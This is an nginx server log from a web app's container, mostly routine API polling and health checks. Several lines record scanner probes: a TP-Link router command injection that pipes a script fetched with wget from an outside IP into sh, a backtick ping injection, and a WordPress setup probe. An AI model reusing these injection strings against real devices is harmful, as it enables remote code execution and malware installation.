captely-nginx  | 2025-06-08T13:59:27.001300553Z 2025/06/08 13:59:27 [info] 29#29: *685 SSL_do_handshake() failed (SSL: error:0A00018C:SSL routines::version too low) while SSL handshaking, client: 51.195.190.14, server: 0.0.0.0:443
captely-nginx  | 2025-06-08T13:59:27.151058689Z 2025/06/08 13:59:27 [info] 29#29: *686 SSL_do_handshake() failed (SSL: error:0A00018C:SSL routines::version too low) while SSL handshaking, client: 51.195.190.14, server: 0.0.0.0:443
captely-nginx  | 2025-06-08T13:59:30.453923652Z 82.64.76.148 - - [08/Jun/2025:13:59:30 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.045 request_time=0.045
captely-nginx  | 2025-06-08T13:59:30.575772339Z 82.64.76.148 - - [08/Jun/2025:13:59:30 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.061 request_time=0.061
captely-nginx  | 2025-06-08T13:59:35.560442736Z 82.64.76.148 - - [08/Jun/2025:13:59:35 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.045 request_time=0.045
captely-nginx  | 2025-06-08T13:59:40.462399699Z 82.64.76.148 - - [08/Jun/2025:13:59:40 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.053 request_time=0.053
captely-nginx  | 2025-06-08T13:59:40.531032974Z 82.64.76.148 - - [08/Jun/2025:13:59:40 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.041 request_time=0.041
captely-nginx  | 2025-06-08T13:59:40.605183292Z 82.64.76.148 - - [08/Jun/2025:13:59:40 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.047 request_time=0.047
captely-nginx  | 2025-06-08T13:59:45.592204567Z 82.64.76.148 - - [08/Jun/2025:13:59:45 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.068 request_time=0.068
captely-nginx  | 2025-06-08T13:59:50.456232441Z 82.64.76.148 - - [08/Jun/2025:13:59:50 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.048 request_time=0.048
captely-nginx  | 2025-06-08T13:59:50.562481886Z 82.64.76.148 - - [08/Jun/2025:13:59:50 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.045 request_time=0.045
captely-nginx  | 2025-06-08T13:59:50.911674915Z 127.0.0.1 - - [08/Jun/2025:13:59:50 +0000] "GET /health HTTP/1.1" 301 169 "-" "curl/8.12.1" "-" upstream_addr=- upstream_response_time=- request_time=0.000
captely-nginx  | 2025-06-08T13:59:50.912162711Z 2025/06/08 13:59:50 [info] 29#29: *696 client 127.0.0.1 closed keepalive connection
captely-nginx  | 2025-06-08T13:59:55.959244066Z 82.64.76.148 - - [08/Jun/2025:13:59:55 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.043 request_time=0.043
captely-nginx  | 2025-06-08T13:59:56.932111437Z 82.64.76.148 - - [08/Jun/2025:13:59:56 +0000] "GET /api/credits/info HTTP/1.1" 200 111 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.8:8000 upstream_response_time=0.063 request_time=0.063
captely-nginx  | 2025-06-08T13:59:59.223833074Z 87.121.84.34 - - [08/Jun/2025:13:59:59 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36" "-" upstream_addr=- upstream_response_time=- request_time=0.000
captely-nginx  | 2025-06-08T14:00:00.228664172Z 2025/06/08 14:00:00 [info] 29#29: *700 writev() failed (32: Broken pipe), client: 87.121.84.34, server: _, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1", host: "143.244.204.111:80"
captely-nginx  | 2025-06-08T14:00:00.228726648Z 87.121.84.34 - - [08/Jun/2025:14:00:00 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36" "-" upstream_addr=- upstream_response_time=- request_time=0.000
captely-nginx  | 2025-06-08T14:00:00.935420705Z 82.64.76.148 - - [08/Jun/2025:14:00:00 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.048 request_time=0.048
captely-nginx  | 2025-06-08T14:00:01.011769801Z 82.64.76.148 - - [08/Jun/2025:14:00:01 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.060 request_time=0.060
captely-nginx  | 2025-06-08T14:00:05.932663209Z 82.64.76.148 - - [08/Jun/2025:14:00:05 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.048 request_time=0.048
captely-nginx  | 2025-06-08T14:00:10.933368311Z 82.64.76.148 - - [08/Jun/2025:14:00:10 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.064 request_time=0.064
captely-nginx  | 2025-06-08T14:00:10.997592803Z 82.64.76.148 - - [08/Jun/2025:14:00:10 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.049 request_time=0.049
captely-nginx  | 2025-06-08T14:00:11.062009883Z 82.64.76.148 - - [08/Jun/2025:14:00:11 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.050 request_time=0.050
captely-nginx  | 2025-06-08T14:00:15.950023609Z 82.64.76.148 - - [08/Jun/2025:14:00:15 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.073 request_time=0.073
captely-nginx  | 2025-06-08T14:00:20.931097633Z 82.64.76.148 - - [08/Jun/2025:14:00:20 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.054 request_time=0.054
captely-nginx  | 2025-06-08T14:00:20.986736168Z 127.0.0.1 - - [08/Jun/2025:14:00:20 +0000] "GET /health HTTP/1.1" 301 169 "-" "curl/8.12.1" "-" upstream_addr=- upstream_response_time=- request_time=0.000
captely-nginx  | 2025-06-08T14:00:20.987198397Z 2025/06/08 14:00:20 [info] 29#29: *710 client 127.0.0.1 closed keepalive connection
captely-nginx  | 2025-06-08T14:00:20.994635008Z 82.64.76.148 - - [08/Jun/2025:14:00:20 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.048 request_time=0.048
captely-nginx  | 2025-06-08T14:00:25.922515672Z 82.64.76.148 - - [08/Jun/2025:14:00:25 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.049 request_time=0.049
captely-nginx  | 2025-06-08T14:00:26.923888629Z 82.64.76.148 - - [08/Jun/2025:14:00:26 +0000] "GET /api/credits/info HTTP/1.1" 200 111 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.8:8000 upstream_response_time=0.052 request_time=0.052
captely-nginx  | 2025-06-08T14:00:30.915490119Z 82.64.76.148 - - [08/Jun/2025:14:00:30 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.044 request_time=0.044
captely-nginx  | 2025-06-08T14:00:30.986419592Z 82.64.76.148 - - [08/Jun/2025:14:00:30 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.055 request_time=0.055
captely-nginx  | 2025-06-08T14:00:35.660302928Z 204.76.203.212 - - [08/Jun/2025:14:00:35 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-" upstream_addr=- upstream_response_time=- request_time=0.000
captely-nginx  | 2025-06-08T14:00:35.925805269Z 82.64.76.148 - - [08/Jun/2025:14:00:35 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.049 request_time=0.049
captely-nginx  | 2025-06-08T14:00:40.916725554Z 82.64.76.148 - - [08/Jun/2025:14:00:40 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.043 request_time=0.043
captely-nginx  | 2025-06-08T14:00:40.977525832Z 82.64.76.148 - - [08/Jun/2025:14:00:40 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.045 request_time=0.045
captely-nginx  | 2025-06-08T14:00:41.041731879Z 82.64.76.148 - - [08/Jun/2025:14:00:41 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.050 request_time=0.050
captely-nginx  | 2025-06-08T14:00:41.641760000Z 104.23.223.71 - - [08/Jun/2025:14:00:41 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 200 951 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "2a06:98c0:3600::103" upstream_addr=172.18.0.13:80 upstream_response_time=0.002 request_time=0.002
captely-nginx  | 2025-06-08T14:00:45.660002449Z 2025/06/08 14:00:45 [info] 29#29: *715 client 204.76.203.212 closed keepalive connection
captely-nginx  | 2025-06-08T14:00:45.943047454Z 82.64.76.148 - - [08/Jun/2025:14:00:45 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.073 request_time=0.073
captely-nginx  | 2025-06-08T14:00:50.191109742Z 79.124.8.120 - - [08/Jun/2025:14:00:50 +0000] "GET / HTTP/1.1" 301 169 "http://164.90.232.146:80/" "Mozilla/5.0" "-" upstream_addr=- upstream_response_time=- request_time=0.000
captely-nginx  | 2025-06-08T14:00:50.962848570Z 82.64.76.148 - - [08/Jun/2025:14:00:50 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.053 request_time=0.053
captely-nginx  | 2025-06-08T14:00:51.034099652Z 82.64.76.148 - - [08/Jun/2025:14:00:51 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.053 request_time=0.053
captely-nginx  | 2025-06-08T14:00:51.064446472Z 127.0.0.1 - - [08/Jun/2025:14:00:51 +0000] "GET /health HTTP/1.1" 301 169 "-" "curl/8.12.1" "-" upstream_addr=- upstream_response_time=- request_time=0.000
captely-nginx  | 2025-06-08T14:00:51.064724078Z 2025/06/08 14:00:51 [info] 29#29: *726 client 127.0.0.1 closed keepalive connection
captely-nginx  | 2025-06-08T14:00:55.200709250Z 2025/06/08 14:00:55 [info] 29#29: *723 client 79.124.8.120 closed keepalive connection
captely-nginx  | 2025-06-08T14:01:21.134801648Z 127.0.0.1 - - [08/Jun/2025:14:01:21 +0000] "GET /health HTTP/1.1" 301 169 "-" "curl/8.12.1" "-" upstream_addr=- upstream_response_time=- request_time=0.000
captely-nginx  | 2025-06-08T14:01:21.136989464Z 2025/06/08 14:01:21 [info] 29#29: *727 client 127.0.0.1 closed keepalive connection
captely-nginx  | 2025-06-08T14:01:32.921481485Z 82.64.76.148 - - [08/Jun/2025:14:01:32 +0000] "GET /api/credits/info HTTP/1.1" 200 111 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.8:8000 upstream_response_time=0.048 request_time=0.048
captely-nginx  | 2025-06-08T14:01:32.941352766Z 82.64.76.148 - - [08/Jun/2025:14:01:32 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.068 request_time=0.068
captely-nginx  | 2025-06-08T14:01:33.005666284Z 82.64.76.148 - - [08/Jun/2025:14:01:33 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.049 request_time=0.049
captely-nginx  | 2025-06-08T14:01:33.079822424Z 82.64.76.148 - - [08/Jun/2025:14:01:33 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.059 request_time=0.059
captely-nginx  | 2025-06-08T14:01:51.205238885Z 127.0.0.1 - - [08/Jun/2025:14:01:51 +0000] "GET /health HTTP/1.1" 301 169 "-" "curl/8.12.1" "-" upstream_addr=- upstream_response_time=- request_time=0.000
captely-nginx  | 2025-06-08T14:01:51.206017322Z 2025/06/08 14:01:51 [info] 29#29: *733 client 127.0.0.1 closed keepalive connection
captely-nginx  | 2025-06-08T14:02:21.273313150Z 127.0.0.1 - - [08/Jun/2025:14:02:21 +0000] "GET /health HTTP/1.1" 301 169 "-" "curl/8.12.1" "-" upstream_addr=- upstream_response_time=- request_time=0.000
captely-nginx  | 2025-06-08T14:02:21.273613277Z 2025/06/08 14:02:21 [info] 29#29: *734 client 127.0.0.1 closed keepalive connection
captely-nginx  | 2025-06-08T14:02:32.924504249Z 82.64.76.148 - - [08/Jun/2025:14:02:32 +0000] "GET /api/credits/info HTTP/1.1" 200 111 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.8:8000 upstream_response_time=0.051 request_time=0.051
captely-nginx  | 2025-06-08T14:02:32.933850259Z 82.64.76.148 - - [08/Jun/2025:14:02:32 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.062 request_time=0.062
captely-nginx  | 2025-06-08T14:02:33.019866321Z 82.64.76.148 - - [08/Jun/2025:14:02:33 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.043 request_time=0.043
captely-nginx  | 2025-06-08T14:02:33.143112977Z 82.64.76.148 - - [08/Jun/2025:14:02:33 +0000] "GET /api/analytics/dashboard HTTP/1.1" 200 673 "https://captely.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36" "-" upstream_addr=172.18.0.11:8000 upstream_response_time=0.045 request_time=0.045
captely-nginx  | 2025-06-08T14:02:51.350422491Z 127.0.0.1 - - [08/Jun/2025:14:02:51 +0000] "GET /health HTTP/1.1" 301 169 "-" "curl/8.12.1" "-" upstream_addr=- upstream_response_time=- request_time=0.000
captely-nginx  | 2025-06-08T14:02:51.351441514Z 2025/06/08 14:02:51 [info] 29#29: *739 client 127.0.0.1 closed keepalive connection
captely-nginx  | 2025-06-08T14:03:13.794046835Z 195.3.221.137 - - [08/Jun/2025:14:03:13 +0000] "GET /cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`ping+-c+20+45.125.66.79` HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36" "-" upstream_addr=- upstream_response_time=- request_time=0.000
